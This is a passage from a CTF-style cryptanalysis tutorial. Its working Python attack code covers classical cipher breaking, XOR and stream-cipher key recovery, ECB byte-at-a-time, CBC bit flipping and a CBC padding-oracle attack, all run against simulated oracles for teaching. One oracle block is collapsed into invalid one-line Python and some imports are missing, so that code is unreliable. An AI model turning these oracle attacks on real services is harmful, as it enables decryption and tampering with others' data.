        print(f"{letter:<8} {cipher_pct:>6.2f}%     {english_pct:>6.2f}%     {cipher_bar}")
        print(f"{'':8} {'':12} {'':12} {english_bar}")
        print()

# Example
cipher = "KHOOR ZRUOG WKLV LV D WHVW PHVVDJH ZLWK PRUH FRQWHQW"
plot_frequency_comparison(cipher)
```

**Kasiski diagram:**

```python
#!/usr/bin/env python3

def visualize_kasiski(ciphertext, ngram_size=3):
    """
    Visualize repeated n-grams and their positions
    Helps identify Vigenère key length patterns
    """
    text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    
    # Find repeated n-grams
    ngram_positions = {}
    for i in range(len(text) - ngram_size + 1):
        ngram = text[i:i+ngram_size]
        if ngram not in ngram_positions:
            ngram_positions[ngram] = []
        ngram_positions[ngram].append(i)
    
    # Filter to only repeated
    repeated = {ng: pos for ng, pos in ngram_positions.items() if len(pos) > 1}
    
    print(f"Repeated {ngram_size}-grams:")
    print("=" * 60)
    
    for ngram, positions in sorted(repeated.items(), key=lambda x: len(x[1]), reverse=True)[:10]:
        print(f"\n'{ngram}' appears {len(positions)} times at positions: {positions}")
        
        # Calculate distances
        distances = []
        for i in range(len(positions) - 1):
            dist = positions[i+1] - positions[i]
            distances.append(dist)
            print(f"  Distance: {dist} (factors: {get_factors(dist)})")
        
        if distances:
            from functools import reduce
            gcd_val = reduce(gcd, distances)
            print(f"  GCD of distances: {gcd_val}")

def get_factors(n):
    """Get all factors of n"""
    factors = []
    for i in range(1, min(n + 1, 20)):
        if n % i == 0:
            factors.append(i)
    return factors

# Example
cipher = "DAZSNHOHMFKLMFKLKWHNLFGIZEVPSLAABTNHOHMFKLQ"
visualize_kasiski(cipher)
```

### CTF-Specific Techniques

**Partial plaintext recovery:**

```python
#!/usr/bin/env python3

def crib_dragging(ciphertext, known_plaintext):
    """
    Use known plaintext (crib) to deduce substitution mapping
    Common in CTF when flag format is known (e.g., "FLAG{")
    """
    cipher = ciphertext.upper()
    plain = known_plaintext.upper()
    
    # Build mapping from known text
    mapping = {}
    reverse_mapping = {}
    
    for i, (c_char, p_char) in enumerate(zip(cipher, plain)):
        if c_char.isalpha() and p_char.isalpha():
            if c_char in mapping and mapping[c_char] != p_char:
                print(f"[!] Conflict: {c_char} maps to both {mapping[c_char]} and {p_char}")
                return None
            
            if p_char in reverse_mapping and reverse_mapping[p_char] != c_char:
                print(f"[!] Conflict: {p_char} is represented by both {reverse_mapping[p_char]} and {c_char}")
                return None
            
            mapping[c_char] = p_char
            reverse_mapping[p_char] = c_char
    
    print(f"Discovered mappings: {mapping}")
    
    # Apply mapping to full ciphertext
    result = ""
    for char in cipher:
        if char in mapping:
            result += mapping[char]
        elif char.isalpha():
            result += '_'  # Unknown
        else:
            result += char
    
    return result, mapping

# Example: CTF flag format
cipher = "IODK{WKLV_LV_WKH_IODJ}"
known = "FLAG{"

partial, mapping = crib_dragging(cipher, known)
print(f"\nPartial decryption: {partial}")
print(f"\nRemaining unknown letters: {set(string.ascii_uppercase) - set(mapping.keys())}")
```

**Pattern-based flag extraction:**

```python
#!/usr/bin/env python3
import re

def find_flag_patterns(text):
    """
    Search for common CTF flag patterns after frequency analysis
    """
    patterns = [
        r'FLAG\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'[A-Z]{3,5}\{[A-Z0-9_]+\}',
        r'\b[A-Z]{4}\{.*?\}',
    ]
    
    results = []
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        results.extend(matches)
    
    return list(set(results))

def smart_flag_search(ciphertext, key_attempts):
    """
    Try multiple decryption keys and search for flag patterns
    """
    for key in key_attempts:
        # Decrypt with key (example with Caesar)
        decrypted = ""
        for char in ciphertext:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                decrypted += chr((ord(char) - base - key) % 26 + base)
            else:
                decrypted += char
        
        # Search for flags
        flags = find_flag_patterns(decrypted)
        if flags:
            print(f"Key {key}: Found {flags}")
            return key, decrypted, flags
    
    return None, None, []

# Example
cipher = "IODJ{WKLV_LV_D_VHFUHW_IODJ}"
keys = range(26)
key, plain, flags = smart_flag_search(cipher, keys)

if flags:
    print(f"\nDecrypted flag: {flags[0]}")
```

**Automated scoring with multiple metrics:**

```python
#!/usr/bin/env python3

def comprehensive_score(text):
    """
    Combine multiple scoring methods for robust detection
    Returns composite score (lower is better)
    """
    scores = {}
    
    # 1. Chi-squared test
    scores['chi2'] = chi_squared(text, ENGLISH_FREQ)
    
    # 2. Index of Coincidence distance
    ic = index_of_coincidence(text)
    scores['ic_dist'] = abs(ic - 0.0667) * 100
    
    # 3. Dictionary words percentage (inverted)
    dict_pct = dictionary_score(text)
    scores['dict_penalty'] = (1 - dict_pct) * 50
    
    # 4. Common bigrams presence
    text_bigrams = set(analyze_ngrams(text, 2)[:20])
    common_bigrams = set(['TH', 'HE', 'IN', 'ER', 'AN', 'RE', 'ON', 'AT', 'EN', 'ND'])
    bigram_overlap = len(text_bigrams & common_bigrams) / len(common_bigrams)
    scores['bigram_penalty'] = (1 - bigram_overlap) * 30
    
    # 5. Entropy check
    entropy = shannon_entropy(text)
    expected_entropy = 4.1  # Typical for English
    scores['entropy_dist'] = abs(entropy - expected_entropy) * 10
    
    # Weighted combination
    weights = {'chi2': 0.35, 'ic_dist': 0.20, 'dict_penalty': 0.25, 
               'bigram_penalty': 0.15, 'entropy_dist': 0.05}
    
    final_score = sum(scores[k] * weights[k] for k in scores)
    
    return final_score, scores

# Example: Compare different decryptions
candidates = [
    ("Caesar +3", "HELLO WORLD THIS IS A SECRET MESSAGE"),
    ("Wrong key", "IFMMP XPSME UIJT JT B TFDSFU NFTTBHF"),
    ("Random", "XMCKL QJWPU VBZRA HIGFS DOTEN YREL")
]

print("Comprehensive Scoring:")
print("=" * 60)

for name, text in candidates:
    final, breakdown = comprehensive_score(text)
    print(f"\n{name}:")
    print(f"  Final Score: {final:.2f}")
    print(f"  Breakdown: {breakdown}")
```

### Tools and Resources

**Command-line frequency analysis suite:**

```bash
# Install useful tools
sudo apt-get install hashcat john xortool python3-pip

# Python libraries
pip3 install frequency-analysis pycipher nltk

# Download wordlists
wget https://github.com/dwyl/english-words/raw/master/words_alpha.txt
wget https://github.com/first20hours/google-10000-english/raw/master/google-10000-english.txt

# Quadgram frequencies (for advanced scoring)
wget http://practicalcryptography.com/media/cryptanalysis/files/english_quadgrams.txt
```

**Quick frequency analysis one-liners:**

```bash
# Letter frequency (sorted)
cat cipher.txt | tr '[:lower:]' '[:upper:]' | grep -o . | grep '[A-Z]' | sort | uniq -c | sort -rn

# Bigram frequency
cat cipher.txt | tr '[:lower:]' '[:upper:]' | tr -d ' \n' | fold -w2 | sort | uniq -c | sort -rn | head -20

# Trigram frequency
cat cipher.txt | tr '[:lower:]' '[:upper:]' | tr -d ' \n' | fold -w3 | sort | uniq -c | sort -rn | head -20

# Index of Coincidence (approximate)
python3 -c "from collections import Counter; t=''.join(c for c in open('cipher.txt').read().upper() if c.isalpha()); n=len(t); f=Counter(t); print(sum(v*(v-1) for v in f.values())/(n*(n-1)) if n>1 else 0)"

# Entropy
python3 -c "import math; from collections import Counter; t=''.join(c for c in open('cipher.txt').read().upper() if c.isalpha()); n=len(t); f=Counter(t); print(-sum((c/n)*math.log2(c/n) for c in f.values()))"
```

### Important Related Topics

- **Hill cipher cryptanalysis** (matrix-based frequency attacks)
- **Playfair cipher digram analysis** (2x2 grid exploitation)
- **Homophonic substitution detection** (multiple symbols per letter)
- **Modern stream cipher analysis** (bit-level statistical testing)

---

## Cryptographic Attacks Classification

### Ciphertext-Only Attack (COA)

A ciphertext-only attack occurs when the attacker has access only to intercepted ciphertext and must derive the plaintext or key without any knowledge of the corresponding plaintext.

**Attack Scenario:**

```
Attacker has: C₁, C₂, C₃, ..., Cₙ (ciphertexts only)
Goal: Recover plaintext or key
```

**Classical Cipher Analysis:**

```python
from collections import Counter
import string

def frequency_analysis(ciphertext):
    """
    Perform frequency analysis on ciphertext
    Foundation of ciphertext-only attacks on substitution ciphers
    """
    # Remove non-alphabetic characters
    clean_text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    
    # Count frequencies
    freq = Counter(clean_text)
    total = len(clean_text)
    
    # Calculate percentages
    freq_percent = {char: (count/total)*100 for char, count in freq.items()}
    
    # Sort by frequency
    sorted_freq = sorted(freq_percent.items(), key=lambda x: x[1], reverse=True)
    
    # English letter frequency (for comparison)
    english_freq = {
        'E': 12.70, 'T': 9.06, 'A': 8.17, 'O': 7.51, 'I': 6.97,
        'N': 6.75, 'S': 6.33, 'H': 6.09, 'R': 5.99, 'D': 4.25
    }
    
    return {
        'frequencies': sorted_freq,
        'total_chars': total,
        'expected_english': english_freq
    }

# Example: Simple substitution cipher
ciphertext = """
MGZVYZLGJONZXGJPZQRGENZPNZXRPNJNZQRJDNRPGJONZXSNZRNPNZWNZQ
ZGPMPNRZGQRJPZGNPNZPGJPRZNZGPNZNZXRPMPNRZGQRJPZXRPNJNZWGP
"""

result = frequency_analysis(ciphertext)
print("Letter Frequencies:")
for char, freq in result['frequencies'][:10]:
    print(f"{char}: {freq:.2f}%")

print("\nLikely mappings (based on English frequency):")
print("Most common cipher char → likely 'E'")
print("Second most common → likely 'T'")
```

**Index of Coincidence (IoC):**

```python
def index_of_coincidence(text):
    """
    Calculate Index of Coincidence
    Used to determine if cipher is monoalphabetic or polyalphabetic
    
    IoC ≈ 0.065 for English plaintext
    IoC ≈ 0.038 for random/polyalphabetic cipher
    """
    clean_text = ''.join(c.upper() for c in text if c.isalpha())
    n = len(clean_text)
    
    if n <= 1:
        return 0
    
    freq = Counter(clean_text)
    
    # IoC = Σ(fᵢ(fᵢ-1)) / (n(n-1))
    ioc = sum(f * (f - 1) for f in freq.values()) / (n * (n - 1))
    
    return ioc

def detect_cipher_type(ciphertext):
    """
    Determine likely cipher type based on IoC
    [Inference] Classification based on statistical analysis
    """
    ioc = index_of_coincidence(ciphertext)
    
    if ioc > 0.06:
        return "Likely monoalphabetic substitution (IoC: {:.4f})".format(ioc)
    elif ioc > 0.045:
        return "Likely short-key polyalphabetic (IoC: {:.4f})".format(ioc)
    else:
        return "Likely long-key polyalphabetic or stream cipher (IoC: {:.4f})".format(ioc)

# Example
cipher1 = "MGZVYZLGJONZXGJPZQRGENZ" * 10  # Monoalphabetic
cipher2 = "XYZABCDEFGHIJKLMNOPQRST" * 10  # More random

print(detect_cipher_type(cipher1))
print(detect_cipher_type(cipher2))
```

**Vigenère Cipher Breaking (COA):**

```python
def kasiski_examination(ciphertext, min_length=3):
    """
    Kasiski examination to find Vigenère key length
    Finds repeated sequences and their spacing
    """
    import math
    from collections import defaultdict
    
    clean_text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    
    # Find repeated sequences
    repeated = defaultdict(list)
    
    for length in range(min_length, min(20, len(clean_text)//2)):
        for i in range(len(clean_text) - length):
            sequence = clean_text[i:i+length]
            for j in range(i+length, len(clean_text) - length):
                if clean_text[j:j+length] == sequence:
                    repeated[sequence].append(j - i)
    
    # Calculate GCD of spacings
    if not repeated:
        return None
    
    all_spacings = []
    for sequence, spacings in repeated.items():
        all_spacings.extend(spacings)
    
    if not all_spacings:
        return None
    
    # Find GCD of all spacings
    key_length = all_spacings[0]
    for spacing in all_spacings[1:]:
        key_length = math.gcd(key_length, spacing)
    
    return key_length

def break_vigenere_coa(ciphertext):
    """
    Complete Vigenère cipher breaking using ciphertext-only
    """
    # Step 1: Determine key length
    key_length = kasiski_examination(ciphertext)
    
    if not key_length or key_length == 1:
        # Try Friedman test as backup
        key_length = friedman_test(ciphertext)
    
    print(f"[Inference] Estimated key length: {key_length}")
    
    # Step 2: Split into Caesar cipher columns
    clean_text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    columns = [''] * key_length
    
    for i, char in enumerate(clean_text):
        columns[i % key_length] += char
    
    # Step 3: Perform frequency analysis on each column
    key = ''
    for column in columns:
        # Find most likely shift for this column
        best_shift = 0
        best_score = float('inf')
        
        for shift in range(26):
            # Decrypt with this shift
            decrypted = ''.join(chr((ord(c) - ord('A') - shift) % 26 + ord('A')) 
                              for c in column)
            
            # Score based on English frequency
            score = chi_squared_score(decrypted)
            
            if score < best_score:
                best_score = score
                best_shift = shift
        
        key += chr(best_shift + ord('A'))
    
    return key

def friedman_test(ciphertext):
    """
    Friedman test to estimate Vigenère key length
    [Inference] Based on expected vs observed IoC
    """
    clean_text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    n = len(clean_text)
    ioc = index_of_coincidence(clean_text)
    
    # Estimate key length
    # k ≈ (0.027 * n) / ((n-1) * ioc - 0.038 * n + 0.065)
    numerator = 0.027 * n
    denominator = (n - 1) * ioc - 0.038 * n + 0.065
    
    if denominator <= 0:
        return None
    
    key_length = numerator / denominator
    return round(key_length)

def chi_squared_score(text):
    """
    Calculate chi-squared statistic against English
    Lower score = more English-like
    """
    english_freq = {
        'A': 0.082, 'B': 0.015, 'C': 0.028, 'D': 0.043, 'E': 0.127,
        'F': 0.022, 'G': 0.020, 'H': 0.061, 'I': 0.070, 'J': 0.002,
        'K': 0.008, 'L': 0.040, 'M': 0.024, 'N': 0.067, 'O': 0.075,
        'P': 0.019, 'Q': 0.001, 'R': 0.060, 'S': 0.063, 'T': 0.091,
        'U': 0.028, 'V': 0.010, 'W': 0.023, 'X': 0.001, 'Y': 0.020,
        'Z': 0.001
    }
    
    text_freq = Counter(text)
    n = len(text)
    
    chi_squared = 0
    for char in string.ascii_uppercase:
        expected = english_freq[char] * n
        observed = text_freq.get(char, 0)
        
        if expected > 0:
            chi_squared += ((observed - expected) ** 2) / expected
    
    return chi_squared
```

**Modern Cipher COA - ECB Mode Detection:**

```python
from Crypto.Cipher import AES
from collections import Counter

def detect_ecb_mode(ciphertext, block_size=16):
    """
    Detect ECB mode encryption via repeated blocks
    Pure ciphertext-only attack
    """
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    unique_blocks = len(set(blocks))
    total_blocks = len(blocks)
    
    repetition_rate = 1 - (unique_blocks / total_blocks)
    
    if repetition_rate > 0.1:  # More than 10% repetition
        return {
            'likely_ecb': True,
            'repetition_rate': repetition_rate,
            'repeated_blocks': total_blocks - unique_blocks
        }
    else:
        return {
            'likely_ecb': False,
            'repetition_rate': repetition_rate,
            'repeated_blocks': 0
        }

# Example: ECB detection
def create_ecb_example():
    """Create example ECB encrypted data"""
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_ECB)
    
    # Plaintext with repetition
    plaintext = b"YELLOW SUBMARINE" * 10
    # Pad to block size
    padded = plaintext + b'\x00' * (16 - len(plaintext) % 16)
    
    ciphertext = cipher.encrypt(padded)
    return ciphertext

ecb_ciphertext = create_ecb_example()
result = detect_ecb_mode(ecb_ciphertext)
print(f"ECB detected: {result['likely_ecb']}")
print(f"Repetition rate: {result['repetition_rate']:.2%}")
```

**RSA Small Exponent Attack (COA):**

```python
def rsa_small_e_attack(ciphertext, e, n):
    """
    Attack RSA when e is small and m^e < n
    Pure ciphertext-only attack
    """
    import gmpy2
    
    # If m^e < n, then c = m^e (no modular reduction)
    # Therefore m = c^(1/e)
    
    # Try direct root extraction
    m = gmpy2.iroot(ciphertext, e)
    
    if m[1]:  # If exact root exists
        return int(m[0])
    
    # If m^e is slightly larger than n, try c + kn for small k
    for k in range(1, 1000):
        candidate = ciphertext + k * n
        m = gmpy2.iroot(candidate, e)
        if m[1]:
            return int(m[0])
    
    return None

# Example: RSA with e=3
from Crypto.Util.number import bytes_to_long, long_to_bytes

# Weak RSA setup (for demonstration)
e = 3
n = 0x9b7e1c8f2a3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0
c = 0x1234567890abcdef  # Small ciphertext

m = rsa_small_e_attack(c, e, n)
if m:
    print(f"Recovered plaintext: {long_to_bytes(m)}")
```

**CTF Recognition Patterns:**

```python
def analyze_coa_scenario(ciphertext_data):
    """
    Analyze whether ciphertext-only attack is viable
    [Inference] Based on ciphertext characteristics
    """
    findings = []
    
    # Check 1: Length and entropy
    if len(ciphertext_data) < 100:
        findings.append("SHORT - May be vulnerable to brute force")
    
    # Check 2: Repeated patterns
    if isinstance(ciphertext_data, bytes):
        blocks = [ciphertext_data[i:i+16] for i in range(0, len(ciphertext_data), 16)]
        if len(blocks) != len(set(blocks)):
            findings.append("REPEATED BLOCKS - Likely ECB mode")
    
    # Check 3: Character distribution (if text-based)
    if isinstance(ciphertext_data, str):
        ioc = index_of_coincidence(ciphertext_data)
        if ioc > 0.06:
            findings.append(f"HIGH IoC ({ioc:.4f}) - Likely substitution cipher")
        elif ioc > 0.04:
            findings.append(f"MEDIUM IoC ({ioc:.4f}) - Possible weak polyalphabetic")
    
    # Check 4: Length patterns
    if isinstance(ciphertext_data, bytes) and len(ciphertext_data) % 16 == 0:
        findings.append("BLOCK-ALIGNED - Likely block cipher")
    
    return findings

# Example usage
test_cipher = "MGZVYZLGJONZXGJPZQRGENZ" * 5
findings = analyze_coa_scenario(test_cipher)
for finding in findings:
    print(f"[!] {finding}")
```

### Known Plaintext Attack (KPA)

An attack where the attacker has access to both plaintext and corresponding ciphertext pairs, and uses this knowledge to derive the key or decrypt other ciphertexts.

**Attack Scenario:**

```
Attacker has: (P₁, C₁), (P₂, C₂), ..., (Pₙ, Cₙ)
Goal: Recover key K or decrypt unknown ciphertext C'
```

**XOR Key Recovery:**

```python
def recover_xor_key(plaintext, ciphertext):
    """
    Recover XOR key from known plaintext-ciphertext pair
    Most basic known plaintext attack
    """
    if len(plaintext) != len(ciphertext):
        raise ValueError("Plaintext and ciphertext must be same length")
    
    # XOR plaintext with ciphertext to get key
    key = bytes(p ^ c for p, c in zip(plaintext, ciphertext))
    
    return key

def recover_repeating_key_xor(plaintext_pairs):
    """
    Recover repeating XOR key from multiple known plaintext pairs
    """
    keys = []
    
    for plaintext, ciphertext in plaintext_pairs:
        partial_key = recover_xor_key(plaintext, ciphertext)
        keys.append(partial_key)
    
    # Align keys to find repeating pattern
    max_len = max(len(k) for k in keys)
    
    # Try different key lengths
    for key_length in range(1, max_len + 1):
        candidate_key = bytearray(key_length)
        valid = True
        
        for key in keys:
            for i in range(len(key)):
                pos = i % key_length
                if candidate_key[pos] == 0:
                    candidate_key[pos] = key[i]
                elif candidate_key[pos] != key[i]:
                    valid = False
                    break
            if not valid:
                break
        
        if valid:
            return bytes(candidate_key)
    
    return None

# Example: Recover XOR key
plaintext = b"ATTACK AT DAWN"
key = b"SECRET"
ciphertext = bytes(p ^ key[i % len(key)] for i, p in enumerate(plaintext))

recovered_key = recover_xor_key(plaintext[:len(key)], ciphertext[:len(key)])
print(f"Recovered key: {recovered_key}")

# Decrypt other ciphertexts with recovered key
unknown_cipher = b"\x1a\x0e\x1f\x1b\x0c\x1f"  # Example
decrypted = bytes(c ^ recovered_key[i % len(recovered_key)] 
                  for i, c in enumerate(unknown_cipher))
print(f"Decrypted unknown: {decrypted}")
```

**Stream Cipher Key Recovery:**

```python
def attack_stream_cipher_reuse(plaintext1, ciphertext1, ciphertext2):
    """
    Attack stream cipher with key reuse
    If C1 = P1 ⊕ K and C2 = P2 ⊕ K, then:
    C1 ⊕ C2 = P1 ⊕ P2
    """
    # Recover keystream from known plaintext
    keystream = bytes(p ^ c for p, c in zip(plaintext1, ciphertext1))
    
    # Decrypt other ciphertext using recovered keystream
    plaintext2 = bytes(c ^ k for c, k in zip(ciphertext2, keystream))
    
    return plaintext2

# Example: Two-time pad attack
keystream = b"RANDOMKEYSTREAM!"
plaintext1 = b"HELLO WORLD!!!!!"
plaintext2 = b"SECRET MESSAGE!!"

ciphertext1 = bytes(p ^ k for p, k in zip(plaintext1, keystream))
ciphertext2 = bytes(p ^ k for p, k in zip(plaintext2, keystream))

# Attacker knows plaintext1 and both ciphertexts
recovered_plaintext2 = attack_stream_cipher_reuse(plaintext1, ciphertext1, ciphertext2)
print(f"Recovered: {recovered_plaintext2}")
```

**Block Cipher Key Recovery (Weak Modes):**

```python
def attack_ecb_known_plaintext(known_pairs, target_ciphertext, block_size=16):
    """
    Build ECB codebook from known plaintext-ciphertext pairs
    Use to decrypt blocks in target ciphertext
    """
    # Build codebook
    codebook = {}
    for plaintext, ciphertext in known_pairs:
        # Split into blocks
        for i in range(0, len(plaintext), block_size):
            p_block = plaintext[i:i+block_size]
            c_block = ciphertext[i:i+block_size]
            if len(p_block) == block_size:
                codebook[c_block] = p_block
    
    # Decrypt target using codebook
    decrypted = b''
    for i in range(0, len(target_ciphertext), block_size):
        c_block = target_ciphertext[i:i+block_size]
        if c_block in codebook:
            decrypted += codebook[c_block]
        else:
            decrypted += b'?' * block_size  # Unknown block
    
    return decrypted

# Example: ECB codebook attack
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_ECB)

# Known plaintext-ciphertext pairs
known_plain = b"AAAAAAAAAAAAAAAA" + b"BBBBBBBBBBBBBBBB"
known_cipher = cipher.encrypt(known_plain)

# Target ciphertext (contains same blocks)
target_plain = b"BBBBBBBBBBBBBBBB" + b"AAAAAAAAAAAAAAAA"
target_cipher = cipher.encrypt(target_plain)

# Attack
known_pairs = [(known_plain, known_cipher)]
recovered = attack_ecb_known_plaintext(known_pairs, target_cipher)
print(f"Recovered: {recovered}")
print(f"Expected: {target_plain}")
```

**CBC Bit Flipping (KPA Context):**

```python
def cbc_bit_flip_attack(iv, ciphertext, known_plaintext, target_plaintext, block_size=16):
    """
    Modify IV to change first plaintext block
    Requires knowing original plaintext
    
    P₁ = D(C₁) ⊕ IV
    To get P₁': IV' = IV ⊕ P₁ ⊕ P₁'
    """
    if len(known_plaintext) < block_size:
        known_plaintext = known_plaintext.ljust(block_size, b'\x00')
    if len(target_plaintext) < block_size:
        target_plaintext = target_plaintext.ljust(block_size, b'\x00')
    
    # Calculate required IV modification
    modified_iv = bytes(iv_byte ^ known_byte ^ target_byte
                       for iv_byte, known_byte, target_byte
                       in zip(iv, known_plaintext[:block_size], target_plaintext[:block_size]))
    
    return modified_iv

# Example
from Crypto.Cipher import AES

key = b"SIXTEENBYTE_KEY!"
original_iv = b"SIXTEEN_BYTE_IV!"
cipher = AES.new(key, AES.MODE_CBC, original_iv)

known_plain = b"user=guest;admin=0;"
ciphertext = cipher.encrypt(known_plain.ljust(32, b'\x00'))

# Attacker wants to change to admin
target_plain = b"user=admin;admin=1;"

modified_iv = cbc_bit_flip_attack(original_iv, ciphertext, known_plain, target_plain)

# Decrypt with modified IV
cipher2 = AES.new(key, AES.MODE_CBC, modified_iv)
decrypted = cipher2.decrypt(ciphertext)
print(f"Modified plaintext: {decrypted[:len(target_plain)]}")
```

**DES Complementation Property:**

```python
def des_complementation_attack(plaintext, ciphertext1, ciphertext2):
    """
    Exploit DES complementation property
    If E_K(P) = C, then E_K̄(P̄) = C̄
    Reduces brute-force space by half
    
    [Unverified] Requires specialized DES implementation
    """
    # Check if complementation property holds
    # This reduces key search space from 2^56 to 2^55
    
    # Pseudocode (requires DES library):
    # if ciphertext2 == complement(ciphertext1):
    #     # Only need to search half the keyspace
    #     # Try keys k where first bit = 0
    #     pass
    
    print("[Inference] DES complementation reduces keyspace by half")
    return "Implement with actual DES library"

```

**CTF KPA Recognition:**

```python
def identify_kpa_vulnerability(challenge_data):
    """
    Identify if challenge is vulnerable to known plaintext attack
    [Inference] Based on common CTF patterns
    """
    vulnerabilities = []
    
    # Check 1: Common plaintext formats
    common_prefixes = [
        b'PNG',           # PNG image
        b'GIF',           # GIF image
        b'\x00\x00\x00',  # Common padding
        b'FLAG{',         # CTF flag format
        b'<?xml',         # XML
        b'{"',            # JSON
    ]
    
    if 'known_prefix' in challenge_data:
        vulnerabilities.append("KNOWN PREFIX - Use to recover keystream/key")
    
    # Check 2: Repeated encryption
    if 'multiple_ciphertexts' in challenge_data:
        if challenge_data['multiple_ciphertexts'] > 1:
            vulnerabilities.append("MULTIPLE CIPHERTEXTS - Possible key reuse")
    
    # Check 3: Oracle access
    if 'encryption_oracle' in challenge_data:
        vulnerabilities.append("ENCRYPTION ORACLE - Can generate known plaintext pairs")
    
    # Check 4: File format hints
    if 'file_extension' in challenge_data:
        ext = challenge_data['file_extension']
        if ext in ['.png', '.jpg', '.pdf', '.zip']:
            vulnerabilities.append(f"KNOWN FILE FORMAT ({ext}) - Header is known plaintext")
    
    return vulnerabilities

# Example analysis
challenge = {
    'known_prefix': True,
    'multiple_ciphertexts': 3,
    'file_extension': '.png'
}

vulns = identify_kpa_vulnerability(challenge)
for vuln in vulns:
    print(f"[!] {vuln}")
```

### Chosen Plaintext Attack (CPA)

An attack where the attacker can choose arbitrary plaintexts to be encrypted and observe the resulting ciphertexts, allowing systematic analysis of the cipher's behavior.

**Attack Scenario:**

```
Attacker can: Choose P₁, P₂, ..., Pₙ
              Obtain C₁, C₂, ..., Cₙ where Cᵢ = E(Pᵢ)
Goal: Recover key K or decrypt target ciphertext C'
```

**ECB Byte-at-a-Time Attack:**

```python
def ecb_byte_at_a_time_attack(encryption_oracle, block_size=16):
    """
    Recover secret suffix appended to controlled plaintext
    Classic chosen plaintext attack on ECB mode
    
    Oracle: encrypt(controlled_input || secret)
    """
    # Step 1: Detect block size
    def detect_block_size():
        initial_len = len(encryption_oracle(b''))
        for i in range(1, 64):
            length = len(encryption_oracle(b'A' * i))
            if length != initial_len:
                return length - initial_len
        return 16  # Default
    
    block_size = detect_block_size()
    print(f"[Inference] Detected block size: {block_size}")
    
    # Step 2: Confirm ECB mode
    test_input = b'A' * (block_size * 3)
    ciphertext = encryption_oracle(test_input)
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    if blocks[0] != blocks[1]:
        print("[!] Warning: May not be ECB mode")
    
    # Step 3: Recover secret byte-by-byte
    secret = b''
    target_length = len(encryption_oracle(b''))
    
    for secret_index in range(target_length):
        # Create prefix to align secret byte at end of block
        prefix_length = (block_size - 1 - (secret_index % block_size))
        prefix = b'A' * prefix_length
        
        # Get target ciphertext block
        target_ciphertext = encryption_oracle(prefix)
        target_block_index = (secret_index // block_size)
        target_block = target_ciphertext[target_block_index * block_size:(target_block_index + 1) * block_size]
        
        # Build dictionary of all possible next bytes
        found = False
        for byte_val in range(256):
            test_input = prefix + secret + bytes([byte_val])
            test_ciphertext = encryption_oracle(test_input)
            test_block = test_ciphertext[target_block_index * block_size:(target_block_index + 1) * block_size]
            
            if test_block == target_block:
                secret += bytes([byte_val])
                found = True
                break
        
        if not found:
            break  # Reached padding or end
    
    return secret

# Example: Simulated ECB oracle
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

SECRET_KEY = get_random_bytes(16)
UNKNOWN_STRING = b"Secret message to recover!"

def ecb_oracle(attacker_controlled):
    """Encryption oracle that appends secret"""
    plaintext = attacker_controlled + UNKNOWN_STRING
    # Pad to block size
    pad_length = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_length]) * pad_length
    
    cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
    return cipher.encrypt(plaintext)

# Attack
recovered = ecb_byte_at_a_time_attack(ecb_oracle)
print(f"Recovered secret: {recovered}")
```

**CBC Padding Oracle Attack:**

```python
def cbc_padding_oracle_attack(ciphertext, iv, padding_oracle, block_size=16):
    """
    Decrypt CBC ciphertext using padding oracle
    Oracle returns True if padding is valid, False otherwise
    """
    blocks = [iv] + [ciphertext[i:i+block_size] 
                     for i in range(0, len(ciphertext), block_size)]
    
    plaintext = b''
    
    # Decrypt each block
    for block_num in range(1, len(blocks)):
        decrypted_block = bytearray(block_size)
        
        # Decrypt byte-by-byte from right to left
        for pad_val in range(1, block_size + 1):
            # Create probe block
            probe = bytearray(blocks[block_num - 1])
            
            # Set known bytes to produce correct padding
            for k in range(1, pad_val):
                probe[block_size - k] ^= decrypted_block[block_size - k] ^ pad_val
            
            # Brute force current byte
            found = False
            for guess in range(256):
                probe[block_size - pad_val] = guess
                
                # Test padding
                if padding_oracle(bytes(probe) + blocks[block_num]):
                    # Valid padding found
                    decrypted_block[block_size - pad_val] = guess ^ blocks[block_num - 1][block_size - pad_val] ^ pad_val
                    found = True
                    break
            
            if not found:
                raise Exception(f"Failed to decrypt byte at position {block_size - pad_val}")
        
        plaintext += bytes(decrypted_block)
    
    # Remove padding
    pad_length = plaintext[-1]
    return plaintext[:-pad_length]

# Example: Simulated padding oracle
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

ORACLE_KEY = get_random_bytes(16)

def padding_oracle(ciphertext): """ Simulated padding oracle Returns True if padding is valid, False otherwise """ try: cipher = AES.new(ORACLE_KEY, AES.MODE_CBC, ciphertext[:16]) plaintext = cipher.decrypt(ciphertext[16:]) unpad(plaintext, 16) # Raises exception if padding invalid return True except: return False

# Create test ciphertext

test_iv = get_random_bytes(16) test_plaintext = b"SECRET MESSAGE!!" cipher = AES.new(ORACLE_KEY, AES.MODE_CBC, test_iv) test_ciphertext = cipher.encrypt(pad(test_plaintext, 16))

# Attack (in real CTF, would use remote oracle)

# recovered = cbc_padding_oracle_attack(test_ciphertext, test_iv, padding_oracle)

# print(f"Recovered: {recovered}")
````

**Block Size Detection:**

```python
def detect_block_size_cpa(encryption_oracle):
    """
    Detect block cipher block size using chosen plaintext
    """
    # Start with empty plaintext
    base_length = len(encryption_oracle(b''))
    
    # Add bytes until length changes
    for i in range(1, 256):
        current_length = len(encryption_oracle(b'A' * i))
        if current_length != base_length:
            block_size = current_length - base_length
            return block_size
    
    return None

def detect_mode_cpa(encryption_oracle, block_size):
    """
    Detect if ECB mode is being used
    """
    # Create plaintext with repeated blocks
